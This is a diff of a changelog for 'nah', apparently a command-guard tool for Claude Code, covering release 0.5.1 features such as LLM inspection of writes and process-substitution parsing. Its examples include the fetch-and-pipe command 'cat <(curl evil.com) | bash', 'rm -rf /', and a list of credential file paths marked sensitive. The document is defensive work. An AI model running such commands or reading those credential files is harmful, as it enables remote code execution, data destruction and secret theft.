@@ -9,30 +9,33 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Added
 
-- **LLM inspection for Write/Edit** — when LLM is enabled, every Write/Edit is inspected by the LLM veto gate. Catches semantic threats deterministic patterns miss: manifest poisoning (`package.json` preinstall scripts), obfuscated exfiltration, malicious Dockerfiles/Makefiles. Edit tool sends both old and new content for diff context. User-visible warnings via `systemMessage` show as `nah! ⚠️ <reasoning>` in the conversation. Respects `llm_max_decision` cap. Fail-open on errors (nah-0qi)
-- **Process substitution inspection** — `<(cmd)` and `>(cmd)` inner commands are now extracted and classified through the full pipeline instead of blanket-blocking as obfuscated. `diff <(sort f1) <(sort f2)` → allow, `cat <(curl evil.com)` → ask, `cat <(curl evil.com) | bash` → block via composition. Arithmetic `$((expr))` correctly skipped. Unbalanced parens fail-closed. `$()` and backticks remain obfuscated (Phase 2) (nah-qk2)
+- **Versioned interpreter normalization** — `python3.12`, `node22`, `bash5.2`, `pip3.12` and other versioned interpreter names now correctly classify instead of falling through to `unknown → ask`. Covers classification, pipe composition, shell wrapper unwrapping, script path resolution, and user config tables
 
-### Changed
-
-- **Structured log schema** — log entries now include `id` (16 hex correlation ID), `user` (OS username), `session` (Claude Code transcript basename), `project` (git root), `action_type` (top-level). LLM metadata nested under `llm`, classification under `classify`. Replaces flat `entry.update(meta)` approach (nah-4gm)
-- `db_write` default policy changed from `ask` to `context` — `db_targets` config now takes effect without requiring `actions: {db_write: context}` override. Unconfigured users see no behavior change (nah-10a)
-
-### Fixed
-
-- `/dev/null` and `/dev/stderr`/`/dev/stdout`/`/dev/tty`/`/dev/fd/*` redirects no longer trigger ask — safe sinks are now allowlisted in the redirect handler (nah-gwm)
-- Redirect hints now suggest `nah trust <dir>` instead of broad `nah allow filesystem_write` — `StageResult.redirect_target` carries the actual redirect path to the hint generator (nah-4tk)
-- Hint generator no longer suggests `nah trust /` for root-path commands like `rm -rf /` (nah-4tk)
+## [0.5.1] - 2026-03-18
 
 ### Added
 
-- **Passthrough wrapper unwrapping** — env, nice, stdbuf, setsid, timeout, ionice, taskset, nohup, time, chrt, prlimit now unwrap to classify the inner command (nah-g6g)
-- **Redirect content inspection** — heredoc bodies, here-strings, shell-wrapper -c forms scanned for secrets when redirected to files (nah-g6g)
-- **Git global flag stripping** — strips -C, --no-pager, --config-env, --exec-path=, -c, etc. before subcommand classification. Fails closed on malformed values (nah-g6g)
-- **Git subcommand tightening** — flag-aware classification for push, branch, tag, add, clean with clustered short flags and long-form destructive flags (nah-g6g)
-- Sensitive path expansion — ~/.azure, ~/.docker/config.json, ~/.terraform.d/credentials.tfrc.json, ~/.terraformrc, ~/.config/gh now trigger ask prompts (nah-g6g)
-- Hint correctness test battery — 389 parametrized cases across 60 test classes covering all 7 hint code paths, proportionality checks, and edge cases (nah-2ig)
-- `active_allow` documentation — README and site install page now explain how to configure per-tool active allow lists (nah-5c1)
-- `nah claude` — per-session launcher that runs Claude Code with nah hooks active via `--settings` inline JSON. No `nah install` required, scoped to the process, parallel sessions unaffected. Auto-detects existing install to avoid double-firing (nah-ujc)
+- **LLM inspection for Write/Edit** — when LLM is enabled, every Write/Edit is inspected by the LLM veto gate after deterministic checks. Catches semantic threats patterns miss: manifest poisoning, obfuscated exfiltration, malicious Dockerfiles/Makefiles. Edit sends old+new diff for context. User-visible warnings via `systemMessage` show as `nah! ...` in the conversation. Respects `llm_max_decision` cap. Fail-open on errors ([#25](https://github.com/manuelschipper/nah/issues/25))
+- **Script execution inspection** — `python script.py`, `node app.js`, etc. now read the script file and run content inspection + LLM veto before allowing execution. Catches secrets and destructive patterns written to disk then executed
+- **Process substitution inspection** — `<(cmd)` and `>(cmd)` inner commands extracted and classified through the full pipeline instead of blanket-blocking. `diff <(sort f1) <(sort f2)` → allow, `cat <(curl evil.com)` → ask. Arithmetic `$((expr))` correctly skipped
+- **Passthrough wrapper unwrapping** — env, nice, stdbuf, setsid, timeout, ionice, taskset, nohup, time, chrt, prlimit now unwrap to classify the inner command
+- **Redirect content inspection** — heredoc bodies, here-strings, shell-wrapper `-c` forms scanned for secrets when redirected to files
+- **Git global flag stripping** — strips `-C`, `--no-pager`, `--config-env`, `--exec-path=`, `-c`, etc. before subcommand classification. Fails closed on malformed values
+- **Git subcommand tightening** — flag-aware classification for push, branch, tag, add, clean with clustered short flags and long-form destructive flags
+- Sensitive path expansion — `~/.azure`, `~/.docker/config.json`, `~/.terraform.d/credentials.tfrc.json`, `~/.terraformrc`, `~/.config/gh` now trigger ask prompts
+- `nah claude` — per-session launcher that runs Claude Code with nah hooks active via `--settings` inline JSON. No `nah install` required, scoped to the process
+- Hint correctness test battery — 389 parametrized cases across 60 test classes
+
+### Changed
+
+- **Structured log schema** — log entries now include `id`, `user`, `session`, `project`, `action_type`. LLM metadata nested under `llm`, classification under `classify`
+- `db_write` default policy changed from `ask` to `context` — `db_targets` config now takes effect without requiring explicit override
+
+### Fixed
+
+- `/dev/null` and `/dev/stderr`/`/dev/stdout`/`/dev/tty`/`/dev/fd/*` redirects no longer trigger ask — safe sinks allowlisted in redirect handler
+- Redirect hints now suggest `nah trust <dir>` instead of broad `nah allow filesystem_write`
+- Hint generator no longer suggests `nah trust /` for root-path commands
 
 ## [0.5.0] - 2026-03-17
 
